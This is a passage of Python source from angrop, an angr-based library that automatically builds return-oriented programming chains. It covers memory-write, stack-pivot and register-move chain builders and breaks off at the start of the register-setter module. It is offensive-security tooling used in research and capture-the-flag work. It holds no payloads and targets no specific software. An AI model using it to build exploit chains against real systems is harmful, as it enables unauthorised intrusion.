            test_state.add_constraints(state.memory.load(addr.concreted, data_size//8, endness=arch_endness) -
                                       test_state.memory.load(addr.concreted, data_size//8, endness=arch_endness) ==
                                       claripy.BVV(difference.concreted, data_size))

        # get the actual register values
        all_deps = list(mem_change.addr_dependencies) + list(mem_change.data_dependencies)
        reg_vals = {}
        for reg in set(all_deps):
            reg_vals[reg] = test_state.solver.eval(test_state.registers.load(reg))

        chain = self.set_regs(**reg_vals)
        chain = RopBlock.from_chain(chain)
        chain = self._build_reg_setting_chain([chain, gadget], {})
        return chain

```

`angrop/chain_builder/mem_writer.py`:

```py
import struct
import logging
from collections import defaultdict

import angr
import claripy

from .builder import Builder
from .. import rop_utils
from ..errors import RopException
from ..rop_chain import RopChain
from ..rop_value import RopValue
from ..rop_block import RopBlock
from ..rop_gadget import RopGadget

l = logging.getLogger(__name__)

class MemWriteChain:
    """
    cached memory writing chain, we only need to concretize the variables in the chain to
    generate a new chain
    """
    def __init__(self, builder, gadget, preserve_regs):
        self.project = builder.project
        self.builder = builder
        self.gadget = gadget
        self.preserve_regs = preserve_regs
        mem_write = self.gadget.mem_writes[0]
        self.addr_bv = claripy.BVS("addr", mem_write.addr_size)
        self.data_bv = claripy.BVS("data", mem_write.data_size)
        self.state = builder.make_sim_state(gadget.addr, gadget.stack_change//self.project.arch.bytes+1)
        self.chain = self._build_chain()

    def _build_chain(self):
        mem_write = self.gadget.mem_writes[0]

        # step through the state once to identify the mem_write action
        state = self.state
        final_state = rop_utils.step_to_unconstrained_successor(self.project, state)
        the_action = None
        for a in final_state.history.actions.hardcopy:
            if a.type != "mem" or a.action != "write":
                continue
            if set(rop_utils.get_ast_dependency(a.addr.ast)) == set(mem_write.addr_dependencies) and \
                    set(rop_utils.get_ast_dependency(a.data.ast)) == set(mem_write.data_dependencies):
                the_action = a
                break
        else:
            raise RopException("Couldn't find the matching action")

        # they both need to contain one single variable
        addr_ast = the_action.addr.ast
        data_ast = the_action.data.ast
        assert len(addr_ast.variables) == 1 and len(data_ast.variables) == 1

        # check the register values
        reg_vals = {}
        constrained_addrs = None
        for ast, bv, t in [(addr_ast, self.addr_bv, 'addr'), (data_ast, self.data_bv, 'data')]:
            # in case of short write
            if bv.size() < ast.size():
                bv = claripy.ZeroExt(ast.size() - bv.size(), bv)
            variable = list(ast.variables)[0]
            if variable.startswith('sreg_'):
                reg_vals[variable.split('-', 1)[0][5:]] = self.builder._rebalance_ast(ast, bv, mode='reg')[1]
            elif variable.startswith('symbolic_stack_'):
                if t == 'addr':
                    assert constrained_addrs is None
                    constrained_addrs = [ast]
            else:
                raise RuntimeError("what variable this is?")

        chain = self.builder.set_regs(**reg_vals, preserve_regs=self.preserve_regs)
        chain = RopBlock.from_chain(chain)
        chain = self.builder._build_reg_setting_chain([chain, self.gadget], {}, constrained_addrs=constrained_addrs)

        if not constrained_addrs:
            return chain
        addr_ast = constrained_addrs[0]
        addr_ast_vars = addr_ast.variables
        for _, val in enumerate(chain._values):
            if not val.symbolic:
                continue
            if not addr_ast_vars.intersection(val.ast.variables):
                continue
            ast = self.builder._rebalance_ast(addr_ast, self.addr_bv)[1]
            # FIXME: again endness issue
            if ast.op == 'Reverse':
                ast = ast.args[0]
            val._value = ast
            break
        return chain

    def concretize(self, addr_val, data):
        chain = self.chain.copy()
        fmt = self.project.arch.struct_fmt()
        arch_bytes = self.project.arch.bytes
        arch_bits = self.project.arch.bits
        # replace addr and data
        for idx, val in enumerate(chain._values):
            if not val.symbolic or not val.ast.variables:
                continue
            if list(val.ast.variables)[0].startswith('addr_'):
                test_ast = claripy.algorithm.replace(expr=val.ast,
                                          old=self.addr_bv,
                                          new=addr_val.data)
                new = addr_val.copy()
                new._value = test_ast
                if addr_val._rebase:
                    new.rebase_ptr()
                chain._values[idx] = new
                continue
            if list(val.ast.variables)[0].startswith('data_'):
                var = claripy.BVV(struct.unpack(fmt, data.ljust(arch_bytes, b'\x00'))[0], len(self.data_bv))
                test_ast = claripy.algorithm.replace(expr=val.ast,
                                          old=self.data_bv,
                                          new=var)
                if len(test_ast) < arch_bits: # type: ignore
                    test_ast = claripy.ZeroExt(arch_bits-len(test_ast), test_ast) # type: ignore
                # since this is data, we assume it should not be rebased
                val = RopValue(test_ast, self.project)
                val._rebase = False
                chain._values[idx] = val
                continue
            if list(val.ast.variables)[0].startswith('symbolic_stack_'):
                # FIXME: my lazy implementation, the endness mess really needs to be rewritten
                tmp = claripy.BVS(f"symbolic_stack_{idx}", arch_bits)
                if self.project.arch.memory_endness == 'Iend_LE':
                    tmp = claripy.Reverse(tmp)
                chain._values[idx] = RopValue(tmp, self.project)
        return chain

    @property
    def changed_regs(self):
        s = set()
        for g in self.chain._gadgets:
            s |= g.changed_regs
        return s

class MemWriter(Builder):
    """
    part of angrop's chainbuilder engine, responsible for writing data into memory
    using various techniques
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        self._mem_write_gadgets: set[RopGadget] = None # type: ignore
        self._good_mem_write_gadgets: dict = None # type: ignore
        self._mem_write_chain_cache = defaultdict(list)

    def bootstrap(self):
        self._mem_write_gadgets = self._get_all_mem_write_gadgets(self.chain_builder.gadgets)
        self._good_mem_write_gadgets = defaultdict(set)

    @staticmethod
    def _get_all_mem_write_gadgets(gadgets):
        """
        we consider a gadget mem_write gadget if
        1. it is self-contained
        2. there is only one symbolic memory access and it is a memory write
        3. addr/data are independent
        """
        possible_gadgets = set()
        for g in gadgets:
            if not g.self_contained:
                continue
            sym_rw = [m for m in g.mem_reads + g.mem_changes if m.is_symbolic_access()]
            if len(sym_rw) > 0 or len(g.mem_writes) != 1:
                continue
            for m_access in g.mem_writes:
                if m_access.addr_controllable() and m_access.data_controllable() and m_access.addr_data_independent():
                    possible_gadgets.add(g)
        return possible_gadgets

    def _better_than(self, g1, g2): # pylint: disable=no-self-use
        if g1.stack_change > g2.stack_change:
            return False
        if g1.num_sym_mem_access > g2.num_sym_mem_access:
            return False
        if g1.isn_count > g2.isn_count:
            return False
        if not g1.changed_regs.issubset(g2.changed_regs):
            return False
        if rop_utils.transit_num(g1) > rop_utils.transit_num(g2):
            return False
        return True

    def _gen_mem_write_gadgets(self, string_data, cache_key):
        # create a dict of bytes per write to gadgets
        # assume we need intersection of addr_dependencies and data_dependencies to be 0
        # TODO could allow mem_reads as long as we control the address?

        # generate from the cache first
        if self._good_mem_write_gadgets[cache_key]:
            yield from self._good_mem_write_gadgets[cache_key]

        # now look for gadgets that require least stack change
        possible_gadgets = {g for g in self._mem_write_gadgets if g.self_contained}
        possible_gadgets -= self._good_mem_write_gadgets[cache_key] # already yield these

        reg_setter = self.chain_builder._reg_setter
        can_set_regs = {x for x in reg_setter._reg_setting_dict if reg_setter._reg_setting_dict[x]}
        while possible_gadgets:
            to_remove = set()
            # limit the maximum size of the chain
            best_stack_change = 0x400
            best_gadget = None

            for g in possible_gadgets:
                mem_write = g.mem_writes[0]
                dep_regs = mem_write.addr_dependencies | mem_write.data_dependencies
                if not dep_regs.issubset(can_set_regs):
                    to_remove.add(g)
                    continue

                # estimate the stack_change cost of the gadget
                stack_change = g.stack_change
                for reg in dep_regs:
                    stack_change += reg_setter._reg_setting_dict[reg][0].stack_change
                bytes_per_write = mem_write.data_size // 8
                num_writes = (len(string_data) + bytes_per_write - 1)//bytes_per_write
                stack_change *= num_writes

                if stack_change < best_stack_change:
                    best_gadget = g
                    best_stack_change = stack_change
                if stack_change == best_stack_change and (best_gadget is None or self._better_than(g, best_gadget)):
                    best_gadget = g

            if to_remove:
                possible_gadgets -= to_remove

            if best_gadget:
                possible_gadgets.remove(best_gadget)
                yield best_gadget
            else:
                break

    @rop_utils.timeout(5)
    def _try_write_to_mem(self, gadget, addr, string_data, preserve_regs, fill_byte):
        gadget_code = str(self.project.factory.block(gadget.addr).capstone)
        l.debug("building mem_write chain with gadget:\n%s", gadget_code)
        mem_write = gadget.mem_writes[0]

        # build the chain
        # there should be only two cases. Either it is a string, or it is a single badbyte
        chain = RopChain(self.project, self, badbytes=self.badbytes)
        if len(string_data) == 1 and ord(string_data) in self.badbytes:
            chain += self._write_to_mem_with_gadget_with_cache(gadget, addr, string_data, preserve_regs)
        else:
            bytes_per_write = mem_write.data_size//8
            for i in range(0, len(string_data), bytes_per_write):
                to_write = string_data[i: i+bytes_per_write]
                # pad if needed
                if len(to_write) < bytes_per_write and fill_byte:
                    to_write += fill_byte * (bytes_per_write-len(to_write))
                chain += self._write_to_mem_with_gadget_with_cache(gadget, addr + i, to_write, preserve_regs)

        return chain

    def _write_to_mem(self, addr, string_data, preserve_regs=None, fill_byte=b"\xff"):# pylint:disable=inconsistent-return-statements
        """
        :param addr: address to store the string
        :param string_data: string to store
        :param fill_byte: a byte to use to fill up the string if necessary
        :return: a rop chain
        """
        if preserve_regs is None:
            preserve_regs = set()

        key = (len(string_data), tuple(sorted(preserve_regs)))
        for gadget in self._gen_mem_write_gadgets(string_data, key):
            # sanity checks, make sure it doesn't clobber any preserved_regs
            if gadget.changed_regs.intersection(preserve_regs):
                continue
            mem_write = gadget.mem_writes[0]
            all_deps = mem_write.addr_dependencies | mem_write.data_dependencies
            if all_deps.intersection(preserve_regs):
                continue

            # actually trying each gadget and cache the good gadgets
            try:
                chain = self._try_write_to_mem(gadget, addr, string_data, preserve_regs, fill_byte)
                self._good_mem_write_gadgets[key].add(gadget)
                return chain
            except (RopException, angr.errors.SimEngineError, angr.errors.SimUnsatError):
                pass

        raise RopException("Fail to write data to memory :(")

    def _write_to_mem_with_gadget_with_cache(self, gadget, addr_val, data, preserve_regs):
        mem_write = gadget.mem_writes[0]
        if len(mem_write.addr_dependencies) <= 1 and len(mem_write.data_dependencies) <= 1 and \
                mem_write.data_size in (32, 64):
            if not self._mem_write_chain_cache[gadget]:
                try:
                    cache_chain = MemWriteChain(self, gadget, preserve_regs)
                    self._mem_write_chain_cache[gadget].append(cache_chain)
                except RopException:
                    pass
            for cache_chain in self._mem_write_chain_cache[gadget]:
                if cache_chain.changed_regs.intersection(preserve_regs):
                    continue
                chain = cache_chain.concretize(addr_val, data)
                state = chain.exec()
                sim_data = state.memory.load(addr_val.data, len(data))
                if state.solver.eval(sim_data, cast_to=bytes) == data:
                    return chain
                l.error("write_to_mem_with_gadget_with_cache failed: %s %s %s\n%s\n%s", addr_val,
                        data, preserve_regs, gadget.dstr(), sim_data)
                continue
        return self._write_to_mem_with_gadget(gadget, addr_val, data, preserve_regs)

    def _write_to_mem_with_gadget(self, gadget, addr_val, data, preserve_regs):
        """
        addr_val is a RopValue
        """
        addr_bvs = claripy.BVS("addr", self.project.arch.bits)
        mem_write = gadget.mem_writes[0]
        all_deps = mem_write.addr_dependencies | mem_write.data_dependencies

        # constrain the successor to be at the gadget
        # emulate 'pop pc'
        test_state = self.make_sim_state(gadget.addr, gadget.stack_change//self.project.arch.bytes)

        # step the gadget
        pre_gadget_state = test_state
        state = rop_utils.step_to_unconstrained_successor(self.project, pre_gadget_state)

        # constrain the write
        the_action = None
        for a in state.history.actions.hardcopy:
            if a.type != "mem" or a.action != "write":
                continue
            if set(rop_utils.get_ast_dependency(a.addr.ast)) == set(mem_write.addr_dependencies) or \
                    set(rop_utils.get_ast_dependency(a.data.ast)) == set(mem_write.data_dependencies):
                the_action = a
                break
        else:
            raise RopException("Couldn't find the matching action")

        # constrain the addr
        test_state.add_constraints(the_action.addr.ast == addr_bvs, addr_bvs == addr_val.data)
        pre_gadget_state.add_constraints(the_action.addr.ast == addr_bvs, addr_bvs == addr_val.data)
        pre_gadget_state.options.discard(angr.options.AVOID_MULTIVALUED_WRITES)
        state = rop_utils.step_to_unconstrained_successor(self.project, pre_gadget_state)

        # constrain the data
        test_state.add_constraints(state.memory.load(addr_val.data, len(data)) == claripy.BVV(data))

        # get the actual register values
        reg_vals = {}
        new_addr_val = None
        constrained_addrs = None
        name = addr_bvs._encoded_name.decode()
        for reg in all_deps:
            var = test_state.solver.eval(test_state.registers.load(reg))
            # check whether this reg will propagate to addr
            # if yes, propagate its rebase value
            for c in test_state.solver.constraints:
                if len(c.variables) != 2: # xx == yy
                    continue
                if name not in c.variables:
                    continue
                var_names = set(c.variables)
                var_names.remove(name)
                if reg in var_names.pop():
                    var = RopValue(var, self.project)
                    var._rebase = False
                    if addr_val._rebase:
                        var.rebase_ptr()
                        var._rebase = True
                    new_addr_val = var
                    break
            reg_vals[reg] = var

        # if this address is set by stack
        if new_addr_val is None:
            constrained_addrs = [addr_val.data]

        chain = self.set_regs(**reg_vals, preserve_regs=preserve_regs)
        chain = RopBlock.from_chain(chain)
        chain = self._build_reg_setting_chain([chain, gadget], {}, constrained_addrs=constrained_addrs)
        for idx, val in enumerate(chain._values):
            if not val.symbolic and new_addr_val is not None and not new_addr_val.symbolic and \
                    val.concreted == new_addr_val.concreted:
                chain._values[idx] = new_addr_val
                break

        # verify the write actually works
        state = chain.exec()
        sim_data = state.memory.load(addr_val.data, len(data))
        if not state.solver.eval(sim_data == data):
            raise RopException("memory write fails")

        # the next pc must be in our control
        if len(state.regs.pc.variables) != 1:
            raise RopException("must have only one pc variable")
        if not set(state.regs.pc.variables).pop().startswith("next_pc_"):
            raise RopException("the next pc is not in our control!")
        return chain

    ##### Main Entrance #####
    def write_to_mem(self, addr, data, preserve_regs=None, fill_byte=b"\xff"):
        """
        main function
        1. do parameter sanitization
        2. cutting the data to smaller pieces to handle bad bytes in the data
        """
        if preserve_regs is None:
            preserve_regs = set()

        # sanity check
        if not (isinstance(fill_byte, bytes) and len(fill_byte) == 1):
            raise RopException("fill_byte is not a one byte string, aborting")
        if not isinstance(data, bytes):
            raise RopException("data is not a byte string, aborting")
        if ord(fill_byte) in self.badbytes:
            raise RopException("fill_byte is a bad byte!")
        if isinstance(addr, RopValue) and addr.symbolic:
            raise RopException("cannot write to a symbolic address")

        # split the string into smaller elements so that we can
        # handle bad bytes
        if all(x not in self.badbytes for x in data):
            elems = [data]
        else:
            elems = []
            e = b''
            for x in data:
                if x not in self.badbytes:
                    e += bytes([x])
                else:
                    if e:
                        elems.append(e)
                    elems.append(bytes([x]))
                    e = b''
            if e:
                elems.append(e)

        # do the write
        offset = 0
        chain = RopChain(self.project, self, badbytes=self.badbytes)
        for elem in elems:
            ptr = addr + offset
            if self._word_contain_badbyte(ptr):
                raise RopException(f"{ptr} contains bad byte!")
            if len(elem) != 1 or ord(elem) not in self.badbytes:
                chain += self._write_to_mem(ptr, elem, preserve_regs=preserve_regs, fill_byte=fill_byte)
                offset += len(elem)
            else:
                chain += self._write_to_mem(ptr, elem, preserve_regs=preserve_regs, fill_byte=fill_byte)
                offset += 1
        return chain

```

`angrop/chain_builder/pivot.py`:

```py
import logging
import functools

from .builder import Builder
from .. import rop_utils
from ..errors import RopException

l = logging.getLogger(__name__)

def cmp(g1, g2):
    if len(g1.sp_reg_controllers) < len(g2.sp_reg_controllers):
        return -1
    if len(g1.sp_reg_controllers) > len(g2.sp_reg_controllers):
        return 1

    if g1.stack_change + g1.stack_change_after_pivot < g2.stack_change + g2.stack_change_after_pivot:
        return -1
    if g1.stack_change + g1.stack_change_after_pivot > g2.stack_change + g2.stack_change_after_pivot:
        return 1

    if g1.isn_count < g2.isn_count:
        return -1
    if g1.isn_count > g2.isn_count:
        return 1
    return 0

class Pivot(Builder):
    """
    a chain_builder that builds stack pivoting rop chains
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        self._pivot_gadgets: list = None # type: ignore

    def bootstrap(self):
        self._pivot_gadgets = self.filter_gadgets(self.chain_builder.pivot_gadgets)

    def pivot(self, thing):
        if thing.is_register:
            return self.pivot_reg(thing)
        return self.pivot_addr(thing)

    def pivot_addr(self, addr):
        for gadget in self._pivot_gadgets:
            # constrain the successor to be at the gadget
            # emulate 'pop pc'
            init_state = self.make_sim_state(gadget.addr, gadget.stack_change_before_pivot//self.project.arch.bytes+1)

            # step the gadget
            final_state = rop_utils.step_to_unconstrained_successor(self.project, init_state)

            # constrain the final sp
            final_state.solver.add(final_state.regs.sp == addr.data)
            registers = {}
            for x in gadget.sp_reg_controllers:
                registers[x] = final_state.solver.eval(init_state.registers.load(x))
            chain = self.chain_builder.set_regs(**registers)

            try:
                chain.add_gadget(gadget)
                # iterate through the stack values that need to be in the chain
                sp = init_state.regs.sp
                arch_bytes = self.project.arch.bytes
                for i in range(gadget.stack_change_before_pivot // arch_bytes):
                    sym_word = init_state.memory.load(sp + arch_bytes*i, arch_bytes,
                                                      endness=self.project.arch.memory_endness)
                    val = final_state.solver.eval(sym_word)
                    chain.add_value(val)
                state = chain.exec(stop_at_pivot=True)
                if state.solver.eval(state.regs.sp == addr.data):
                    return chain
            except Exception: # pylint: disable=broad-exception-caught
                continue

        raise RopException(f"Fail to pivot the stack to {addr.data}!")

    def pivot_reg(self, reg_val):
        reg = reg_val.reg_name
        for gadget in self._pivot_gadgets:
            if reg not in gadget.sp_reg_controllers:
                continue

            init_state = self.make_sim_state(gadget.addr, gadget.stack_change_before_pivot//self.project.arch.bytes)
            final_state = rop_utils.step_to_unconstrained_successor(self.project, init_state)

            chain = self.chain_builder.set_regs()

            try:
                chain.add_gadget(gadget)
                # iterate through the stack values that need to be in the chain
                sp = init_state.regs.sp
                arch_bytes = self.project.arch.bytes
                for i in range(gadget.stack_change // arch_bytes):
                    sym_word = init_state.memory.load(sp + arch_bytes*i, arch_bytes,
                                                      endness=self.project.arch.memory_endness)

                    val = final_state.solver.eval(sym_word)
                    chain.add_value(val)
                state = chain.exec(stop_at_pivot=True)
                variables = set(state.regs.sp.variables)
                if len(variables) == 1 and variables.pop().startswith(f'sreg_{reg}'):
                    return chain
                else:
                    chain_str = chain.dstr()
                    l.exception("Somehow angrop thinks\n%s\ncan be use for stack pivoting", chain_str)
            except Exception: # pylint: disable=broad-exception-caught
                continue

        raise RopException(f"Fail to pivot the stack to {reg}!")

    def _effect_tuple(self, g):
        v1 = tuple(sorted(g.sp_controllers))
        return (v1, g.stack_change, g.stack_change_after_pivot)

    def _comparison_tuple(self, g):
        return (g.num_sym_mem_access, len(g.changed_regs), g.isn_count)

    def filter_gadgets(self, gadgets):
        gadgets = [x for x in gadgets if not x.has_conditional_branch and \
                                             x.transit_type != 'jmp_reg' and \
                                             not x.has_symbolic_access()]
        gadgets = self._filter_gadgets(gadgets)
        return sorted(gadgets, key=functools.cmp_to_key(cmp))

```

`angrop/chain_builder/reg_mover.py`:

```py
import logging
import itertools
import multiprocessing as mp
from collections import defaultdict

import networkx as nx
from angr.errors import SimUnsatError

from .builder import Builder
from .. import rop_utils
from ..rop_gadget import RopGadget
from ..rop_chain import RopChain
from ..rop_block import RopBlock
from ..errors import RopException
from ..rop_effect import RopRegMove

l = logging.getLogger(__name__)

_global_reg_mover = None # type: ignore
def _set_global_reg_mover(reg_mover, ptr_list):
    global _global_reg_mover# pylint: disable=global-statement
    _global_reg_mover = reg_mover
    Builder.used_writable_ptrs = ptr_list

def worker_func(t):
    new_move, gadget = t
    gadget.project = _global_reg_mover.project # type: ignore
    pre_preserve = {new_move.from_reg}
    post_preserve = {new_move.to_reg}
    rb = _global_reg_mover.normalize_gadget(gadget, # type: ignore
                                            pre_preserve=pre_preserve,
                                            post_preserve=post_preserve)
    solver = None
    if rb is not None:
        solver = rb._blank_state.solver
    return new_move, gadget.addr, solver, rb

class RegMover(Builder):
    """
    handle register moves such as `mov rax, rcx`
    """
    def __init__(self, chain_builder):
        super().__init__(chain_builder)
        self._reg_moving_gadgets: list[RopGadget] = None # type: ignore
        # TODO: clean up the mess of RopGadget and RopBlock
        self._reg_moving_blocks: set[RopGadget|RopBlock] = None # type: ignore
        self._graph: nx.Graph = None # type: ignore
        self._normalize_todos = {}

    def bootstrap(self):
        self._reg_moving_gadgets = sorted(self.filter_gadgets(self.chain_builder.gadgets), key=lambda g:g.stack_change)
        self._reg_moving_blocks = {g for g in self._reg_moving_gadgets if g.self_contained}
        self._build_move_graph()

    def build_normalize_todos(self):
        """
        identify non-self-contained gadgets that can potentially improve
        our register move graph
        """
        self._normalize_todos = {}
        todos = {}
        for gadget in self._reg_moving_gadgets:
            if gadget.self_contained:
                continue
            # check whether the gadget brings new_moves:
            # 1. the edge doesn't exist at all
            # 2. it moves more bits than all existing ones
            # TODO: 3. fewer clobbered registers?
            new_moves = []
            for m in gadget.reg_moves:
                edge = (m.from_reg, m.to_reg)
                if not self._graph.has_edge(*edge):
                    new_moves.append(m)
                    continue
                edge_data = self._graph.get_edge_data(*edge)
                if m.bits > edge_data['bits']:
                    new_moves.append(m)
                    continue
            for new_move in new_moves:
                if new_move in todos:
                    todos[new_move].append(gadget)
                else:
                    todos[new_move] = [gadget]

        # only normalize best ones
        to_remove = []
        for m1 in todos:
            for m2 in todos:
                if m1 == m2:
                    continue
                if m1.from_reg == m2.from_reg and m1.to_reg == m2.to_reg and m1.bits < m2.bits:
                    to_remove.append(m1)
        for m in to_remove:
            del todos[m]

        # we use address as key here instead of gadget because the gadget
        # returned by multiprocessing may be different from the original one
        for m, gadgets in todos.items():
            for g in gadgets:
                new_moves = [m for m in g.reg_moves if m in todos]
                self._normalize_todos[g.addr] = (g, new_moves)

    def normalize_todos(self):
        addrs = sorted(self._normalize_todos.keys())
        again = True
        while again:
            cnt = 0
            for addr in addrs:
                # take different gadgets to maximize performance
                g, new_moves = self._normalize_todos[addr]
                if new_moves:
                    new_move = new_moves.pop()
                    cnt += 1
                    yield new_move, g
            if cnt == 0:
                again = False

    def normalize_single_threaded(self):
        for new_move, gadget in self.normalize_todos():
            gadget.project = self.project
            pre_preserve = {new_move.from_reg}
            post_preserve = {new_move.to_reg}
            rb = self.normalize_gadget(gadget, pre_preserve=pre_preserve, post_preserve=post_preserve)
            if rb is not None:
                yield new_move, gadget.addr, rb

    def normalize_multiprocessing(self, processes):
        with mp.Manager() as manager:
            # HACK: ideally, used_ptrs should be a resource of each ropblock that can be reassigned
            # when conflict happens. but currently, I'm being lazy and just make sure every pointer
            # is different
            ptr_list = manager.list(Builder.used_writable_ptrs)
            initargs = (self, ptr_list)
            with mp.Pool(processes=processes, initializer=_set_global_reg_mover, initargs=initargs) as pool:
                for new_move, addr, solver, rb in pool.imap_unordered(worker_func, self.normalize_todos()):
                    if rb is None:
                        continue
                    state = rop_utils.make_symbolic_state(self.project, self.arch.reg_list, 0)
                    state.solver = solver
                    rb.set_project(self.project)
                    rb.set_builder(self)
                    rb._blank_state = state
                    yield new_move, addr, rb
            Builder.used_writable_ptrs = list(ptr_list)

    def optimize(self, processes):
        res = False
        self.build_normalize_todos()
        if processes == 1:
            iterable = self.normalize_single_threaded()
        else:
            iterable = self.normalize_multiprocessing(processes)
        for new_move, addr, rb in iterable:
            # if we happen to have normalized another move, don't do it again
            for m in rb.reg_moves:
                todo_new_moves = self._normalize_todos[addr][1]
                if m in todo_new_moves:
                    todo_new_moves.remove(m)
            # now we have this new_move, remove it from the todo list
            for m in rb.reg_moves:
                for addr, tup in self._normalize_todos.items():
                    new_moves = tup[1]
                    if m in new_moves:
                        new_moves.remove(m)
            # we already normalized it, just use it as much as we can
            if rb.popped_regs:
                self.chain_builder._reg_setter._insert_to_reg_dict([rb])
            if not any(m == new_move for m in rb.reg_moves):
                l.warning("normalizing \n%s does not yield any wanted new reg moving capability: %s",
                          rb.dstr(),
                          new_move)
                continue
            res = True
            for move in rb.reg_moves:
                edge = (move.from_reg, move.to_reg)
                if self._graph.has_edge(*edge):
                    edge_data = self._graph.get_edge_data(*edge)
                    edge_blocks = edge_data['block']
                    edge_blocks.append(rb)
                    edge_data['block'] = sorted(edge_blocks, key=lambda x: x.stack_change)
                    if move.bits > edge_data['bits']:
                        edge_data['bits'] = move.bits
                else:
                    self._graph.add_edge(*edge, block=[rb], bits=move.bits)
        return res

    def _build_move_graph(self):
        self._graph = nx.DiGraph()
        graph = self._graph
        # each node is a register
        graph.add_nodes_from(self.arch.reg_list)
        # an edge means there is a move from the src register to the dst register
        objects = defaultdict(list)
        max_bits_dict = defaultdict(int)
        for block in self._reg_moving_blocks:
            for move in block.reg_moves:
                edge = (move.from_reg, move.to_reg)
                objects[edge].append(block)
                if move.bits > max_bits_dict[edge]:
                    max_bits_dict[edge] = move.bits
        for edge, val in objects.items():
            val = sorted(val, key=lambda g:g.stack_change)
            graph.add_edge(edge[0], edge[1], block=val, bits=max_bits_dict[edge])

    def verify(self, chain, preserve_regs, registers):
        """
        given a potential chain, verify whether the chain can move the registers correctly by symbolically
        execute the chain
        """
        chain_str = chain.dstr()
        state = chain.exec()
        for reg, val in registers.items():
            bv = getattr(state.regs, reg)
            if bv.depth != 1 or type(bv.args[0]) != str or val.reg_name not in bv._encoded_name.decode():
                l.exception("Somehow angrop thinks \n%s\n can be used for the chain generation.", chain_str)
                return False
            for act in state.history.actions.hardcopy:
                if act.type not in ("mem", "reg"):
                    continue
                if act.type == 'mem':
                    if act.addr.ast.variables and any(not x.startswith('sym_addr') for x in act.addr.ast.variables):
                        l.exception("memory access outside stackframe\n%s\n", chain_str)
                        return False
                if act.type == 'reg' and act.action == 'write':
                    # get the full name of the register
                    offset = act.offset
                    offset -= act.offset % self.project.arch.bytes
                    reg_name = self.project.arch.translate_register_name(offset)
                    if reg_name in preserve_regs:
                        l.exception("Somehow angrop thinks \n%s\n can be used for the chain generation.", chain_str)
                        return False
        # the next pc must be "next_pc"
        if len(state.regs.pc.variables) != 1:
            return False
        if not set(state.regs.pc.variables).pop().startswith("next_pc_"):
            return False
        return True

    def _recursively_find_chains(self, gadgets, chain, source_regs, hard_preserve_regs, todo_moves):
        """
        source_regs: registers that contain the original values of the source registers
        """
        # FIXME: what if the first gadget moves the second move.from_reg to another reg?
        if not todo_moves:
            return [chain]

        todo_list = []
        for g in gadgets:
            new_moves = set(g.reg_moves).intersection(todo_moves)
            if not new_moves:
                continue
            if g.changed_regs.intersection(hard_preserve_regs):
                continue
            new_source_regs = set()
            for move in new_moves:
                if move.from_reg in source_regs:
                    new_source_regs.add(move.to_reg)
            g_source_regs = source_regs.copy()
            g_source_regs -= g.changed_regs
            g_source_regs.update(new_source_regs)
            new_todo_moves = todo_moves - new_moves
            if any(m.from_reg not in g_source_regs for m in new_todo_moves):
                continue
            new_preserve = hard_preserve_regs.copy()
            new_preserve.update({x.to_reg for x in new_moves})
            new_chain = chain.copy()
            new_chain.append(g)
            todo_list.append((new_chain, g_source_regs, new_preserve, new_todo_moves))

        res = []
        for todo in todo_list:
            res += self._recursively_find_chains(gadgets, *todo)
        return res

    def run(self, preserve_regs=None, **registers):
        if len(registers) == 0:
            return RopChain(self.project, self, badbytes=self.badbytes)

        # sanity check
        preserve_regs = set(preserve_regs) if preserve_regs else set()
        unknown_regs = set(registers.keys()).union(preserve_regs) - set(self.arch.reg_list)
        if unknown_regs:
            raise RopException("unknown registers: %s" % unknown_regs)

        # cast values to RopValue
        for x in registers:
            registers[x] = rop_utils.cast_rop_value(registers[x], self.project)

        # find all blocks that are relevant to our moves
        assert all(val.is_register for _, val in registers.items())
        moves = {RopRegMove(val.reg_name, reg, self.project.arch.bits) for reg, val in registers.items()}
        rop_blocks = self._find_relevant_blocks(moves)

        # use greedy algorithm to find a chain that can do all the moves
        source_regs = {x.from_reg for x in moves}
        chains = self._recursively_find_chains(rop_blocks, [], source_regs, preserve_regs.copy(), moves)
        chains = self._sort_chains(chains)

        # now see whether any of the chain candidates can work
        for rop_blocks in chains:
            chain_str = "\n".join(g.dstr() for g in rop_blocks)
            l.debug("building reg_setting chain with chain:\n%s", chain_str)
            try:
                rb = rop_blocks[0]
                for x in rop_blocks[1:]:
                    rb += x
                if self.verify(rb, preserve_regs, registers):
                    return rb
            except (RopException, SimUnsatError):
                pass

        raise RopException("Couldn't move registers :(")

    def _find_relevant_blocks(self, target_moves):
        """
        find rop_blocks that may perform any of the requested moves
        """
        rop_blocks = set()

        # handle moves using graph search, this allows gadget chaining
        # to perform hard moves that requires multiple gadgets
        graph = self._graph
        for move in target_moves:
            # only consider the shortest path
            # TODO: we should use longer paths if the shortest one does work
            try:
                paths = nx.all_shortest_paths(graph, source=move.from_reg, target=move.to_reg)
                block_gadgets = []
                for path in paths:
                    edges = zip(path, path[1:])
                    edge_block_list = []
                    for edge in edges:
                        edge_blocks = graph.get_edge_data(edge[0], edge[1])['block']
                        edge_block_list.append(edge_blocks)
                    block_gadgets += list(itertools.product(*edge_block_list))

                # now turn them into blocks
                for gs in block_gadgets:
                    assert gs
                    # FIXME: we are using the _build_reg_setting_chain API to turn mixin lists to a RopBlock
                    # which is pretty wrong
                    chain = self._build_reg_setting_chain(gs, {})
                    rb = RopBlock.from_chain(chain)
                    rop_blocks.add(rb)
            except nx.exception.NetworkXNoPath as e: # type: ignore
                raise RopException(f"There is no chain can move {move.from_reg} to {move.to_reg}") from e
        return rop_blocks

    def filter_gadgets(self, gadgets):
        """
        filter gadgets having the same effect
        """
        # first: filter out gadgets that don't do register move
        gadgets = {g for g in gadgets if g.reg_moves and not g.has_conditional_branch and not g.has_symbolic_access()}
        gadgets = self._filter_gadgets(gadgets)
        new_gadgets = set(x for x in gadgets if any(y.from_reg != y.to_reg for y in x.reg_moves))
        return new_gadgets

    def _effect_tuple(self, g):
        v1 = tuple(sorted(g.reg_moves))
        v2 = []
        for x,y in g.reg_dependencies.items():
            v2.append((x, tuple(sorted(y))))
        v2 = tuple(sorted(v2))
        return (v1, v2)

    def _comparison_tuple(self, g):
        return (g.stack_change, g.num_sym_mem_access, rop_utils.transit_num(g), g.isn_count)

```

`angrop/chain_builder/reg_setter.py`:

```py
import itertools
import logging
from collections import defaultdict, Counter
from functools import cmp_to_key

import networkx as nx
from angr.errors import SimUnsatError

from .builder import Builder
from .. import rop_utils
from ..rop_chain import RopChain
from ..rop_block import RopBlock
